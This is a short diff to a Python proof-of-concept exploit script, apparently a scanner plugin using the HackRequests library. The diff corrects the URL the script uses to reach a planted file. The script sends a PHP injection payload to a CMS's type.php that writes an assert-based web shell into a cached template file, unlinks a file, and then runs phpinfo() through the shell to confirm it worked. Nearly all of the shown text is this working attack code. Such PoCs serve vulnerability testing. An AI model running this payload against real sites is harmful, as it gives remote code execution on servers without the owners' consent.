@@ -9,7 +9,7 @@ import HackRequests
 def poc(arg, **kwargs):
     payload = r'''/type.php?template=tag_(){};@unlink(FILE);assert($_GET[1]);{//../rss'''
     hh = HackRequests.http(arg + payload)
-    shell_url = '/data/cache_template/rss.tpl.php?1=phpinfo()'
+    shell_url = arg + '/data/cache_template/rss.tpl.php?1=phpinfo()'
     r = HackRequests.http(shell_url)
     if r.status_code == 200 and 'allow_url_fopen' in r.text():
         result = {
